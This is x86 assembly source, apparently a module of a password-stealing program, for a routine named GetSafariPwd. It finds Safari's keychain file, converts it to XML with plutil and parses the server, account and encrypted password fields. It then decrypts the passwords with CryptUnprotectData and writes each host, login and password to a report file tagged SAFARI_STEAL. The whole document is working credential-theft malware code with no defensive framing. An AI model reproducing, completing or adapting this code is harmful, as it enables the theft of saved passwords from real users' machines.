     
.data?
      safari_keychain           db   200h dup (?)
      safari_pllist             db   200h dup (?)
      safari_decxml             db   200h dup (?)
      safari_pl_line            db   200h dup (?)
      safari_tmp_data           db   1000h dup (?)
      safari_data               db   1000h dup (?)
      safari_account            db   200h dup (?)
      safari_server             db   200h dup (?)
      safari_pwd                db   200h dup (?)
      saf_din                   DATA_BLOB             <>
      saf_dout                  DATA_BLOB             <>
      saf_oe                    DATA_BLOB             <>
     
.code

GetSafariPwd proc
      LOCAL   WTF:DWORD
      LOCAL   p1:DWORD
      LOCAL   pbegin:DWORD
      LOCAL   pend:DWORD
      LOCAL   gbegin:DWORD
      
      mov     dword ptr [DataSize], 0
      mov     dword ptr [stbuf], SAFARI_STEAL
      WriteFile, stfile, addr stbuf, sizeof stbuf, addr SNW, NULL
      
      push    offset stealer_seh_proc
      assume  fs : nothing
      push    dword ptr fs:[0]
      mov     dword ptr fs:[0], esp
      mov     eax, offset GetSafariPwd_seh
      mov     seh.SafeEip, eax
      mov     seh.PrevEbp, ebp
      mov     seh.PrevEsp, esp
      SetFilePointer, stfile, 0, 0, FILE_CURRENT
      mov     dword ptr [savedfilepointer], eax
      
      ; Get keychain path
      mov     byte ptr [safari_keychain], 0
      push    0
      push    CSIDL_APPDATA
      push    offset safari_keychain
      push    0
      call    dword ptr [_SHGetSpecialFolderPath]
      push    offset safari_keychain
      call    dword ptr [_PathAddBackslash]
      lstrcat, addr safari_keychain, addr safari_path1
      GetFileAttributes, addr safari_keychain
      .if     eax == -1 
              jmp     no_safari
      .endif
      ; Get decrypter exe path
      mov     byte ptr [safari_pllist], 0
      push    0
      push    CSIDL_PROGRAM_FILES
      push    offset safari_pllist
      push    0
      call    dword ptr [_SHGetSpecialFolderPath]
      push    offset safari_pllist
      call    dword ptr [_PathAddBackslash]
      lstrcat, addr safari_pllist, addr safari_path2
      GetFileAttributes, addr safari_pllist
      .if     eax == -1 
              jmp     no_safari
      .endif
      ; Get temp path for decrypted xml
      mov     byte ptr [safari_decxml], 0
      GetTempPath, sizeof safari_decxml, addr safari_decxml
      push    offset safari_decxml
      call    dword ptr [_PathAddBackslash]
      lstrcat, addr safari_decxml, addr safari_tmp_xml
      ; Make cmd line
      push    offset safari_keychain
      push    offset safari_decxml
      push    offset safari_exec_cmd
      push    offset safari_pl_line
      call    wsprintf
      add     esp, 4*4
      ; Run plutil
      RtlZeroMemory, addr sui, sizeof sui
      RtlZeroMemory, addr pri, sizeof pri
      xor     eax, eax
      CreateProcess, addr safari_pllist, addr safari_pl_line, eax, eax, eax, DETACHED_PROCESS, eax, eax, addr sui, addr pri
      WaitForSingleObject, pri.hProcess, INFINITE
      ; Parse pwds
      invoke  MapFile, addr safari_decxml, addr mfile, MAP_FILE_A
      test    eax, eax
      je      no_safari
      
      xor     ebx, ebx
    safari_parse_lp:
      mov     ecx, dword ptr [mfile.lpMem]
      add     ecx, ebx
      mov     dword ptr [p1], ecx
      ; find <dict>
      lstrlen, p1
      push    eax
      push    sizeof safari_dict1
      push    dword ptr [p1]
      push    offset safari_dict1
      call    strpos
      test    eax, eax
      je      safari_no_pwds_here
      mov     dword ptr [pbegin], eax
      ; find </dict>
      lstrlen, pbegin
      push    eax
      push    sizeof safari_dict2
      push    dword ptr [pbegin]
      push    offset safari_dict2
      call    strpos
      test    eax, eax
      je      safari_no_pwds_here
      mov     dword ptr [pend], eax
      
      ; find <string>
      lstrlen, pbegin
      push    eax
      push    sizeof safari_acc1
      push    dword ptr [pbegin]
      push    offset safari_acc1
      call    strpos
      test    eax, eax
      je      safari_no_pwds_here
      add     eax, sizeof safari_acc1
      mov     dword ptr [gbegin], eax
      ; find </string>
      lstrlen, gbegin
      push    eax
      push    sizeof safari_acc2
      push    dword ptr [gbegin]
      push    offset safari_acc2
      call    strpos
      test    eax, eax
      je      safari_no_pwds_here
      sub     eax, dword ptr [gbegin]
      add     eax, 1
      lstrcpyn, addr safari_account, gbegin, eax
      
      ; find <data>
      lstrlen, pbegin
      push    eax
      push    sizeof safari_kdata1
      push    dword ptr [pbegin]
      push    offset safari_kdata1
      call    strpos
      test    eax, eax
      je      safari_no_pwds_here
      add     eax, sizeof safari_kdata1
      mov     dword ptr [gbegin], eax
      ; find </data>
      lstrlen, gbegin
      push    eax
      push    sizeof safari_kdata2
      push    dword ptr [gbegin]
      push    offset safari_kdata2
      call    strpos
      test    eax, eax
      je      safari_no_pwds_here
      sub     eax, dword ptr [gbegin]
      add     eax, 1
      lstrcpyn, addr safari_tmp_data, gbegin, eax
      ; del 09h & 0Ah from string
      push    offset safari_data
      push    offset safari_tmp_data
      call    safari_trim
      
      ; find <string>
      lstrlen, pbegin
      push    eax
      push    sizeof safari_serv1
      push    dword ptr [pbegin]
      push    offset safari_serv1
      call    strpos
      test    eax, eax
      je      safari_no_pwds_here
      add     eax, sizeof safari_serv1
      mov     dword ptr [gbegin], eax
      ; find </string>
      lstrlen, gbegin
      push    eax
      push    sizeof safari_serv2
      push    dword ptr [gbegin]
      push    offset safari_serv2
      call    strpos
      test    eax, eax
      je      safari_no_pwds_here
      sub     eax, dword ptr [gbegin]
      add     eax, 1
      lstrcpyn, addr safari_server, gbegin, eax
      ; decode key data
      lstrlen, addr safari_data
      push    eax
      push    offset safari_data
      call    base64_decode
      ; decrypt
      mov     saf_din.cbSize, eax
      mov     eax, offset safari_data
      mov     saf_din.pData, eax
      mov     saf_oe.cbSize, 144
      mov     eax, offset safari_salt
      mov     saf_oe.pData, eax
      
      xor     ecx, ecx
      push    offset saf_dout
      push    CRYPTPROTECT_UI_FORBIDDEN
      push    ecx
      push    ecx
      push    offset saf_oe
      push    ecx
      push    offset saf_din
      call    dword ptr [_CryptUnprotectData]
      test    eax, eax
      je      safari_no_pwds_here
      
      mov     ecx, saf_dout.pData
      mov     eax, dword ptr [ecx]
      inc     eax
      add     ecx, 4
      lstrcpyn, addr safari_pwd, ecx, eax
      
      lstrlen, addr safari_server
      mov     dword ptr [plen], eax
      add     dword ptr [DataSize], sizeof plen
      add     dword ptr [DataSize], eax
      WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
      mov     byte ptr [data_type], REPORT_DATA_HOST
      add     dword ptr [DataSize], sizeof data_type
      WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
      WriteFile, stfile, addr safari_server, plen, addr SNW, NULL
      
      lstrlen, addr safari_account
      mov     dword ptr [plen], eax
      add     dword ptr [DataSize], sizeof plen
      add     dword ptr [DataSize], eax
      WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
      mov     byte ptr [data_type], REPORT_DATA_LOGIN
      add     dword ptr [DataSize], sizeof data_type
      WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
      WriteFile, stfile, addr safari_account, plen, addr SNW, NULL
      
      lstrlen, addr safari_pwd
      mov     dword ptr [plen], eax
      add     dword ptr [DataSize], sizeof plen
      add     dword ptr [DataSize], eax
      WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
      mov     byte ptr [data_type], REPORT_DATA_PWD
      add     dword ptr [DataSize], sizeof data_type
      WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
      WriteFile, stfile, addr safari_pwd, plen, addr SNW, NULL
      
      mov     ebx, dword ptr [pend]
      sub     ebx, dword ptr [mfile.lpMem]
      inc     ebx
      cmp     ebx, dword ptr [mfile.dwFileSize]
      jle     safari_parse_lp
      
    safari_no_pwds_here:
      invoke  UnmapFile, addr mfile
      DeleteFile, addr safari_decxml
    no_safari:
      
    GetSafariPwd_seh:
      pop     dword ptr fs:[0]
      add     esp, 4
      
      WriteFile, stfile, addr DataSize, sizeof DataSize, addr SNW, NULL
      mov     eax, dword ptr [DataSize] ; return actual size of written data
      ret
GetSafariPwd endp

safari_trim proc uses esi edi ecx ebx sfrom:DWORD, sto:DWORD
      mov     esi, dword ptr [sfrom]
      mov     edi, dword ptr [sto]
    saf_trip_lp:
      lodsb
      .if     al == 0
              stosb
              je      saf_trim_end
      .elseif al == 09h
      
      .elseif al == 0Ah
      
      .else
              stosb
      .endif
      jmp     saf_trip_lp
    saf_trim_end:
      ret
safari_trim endp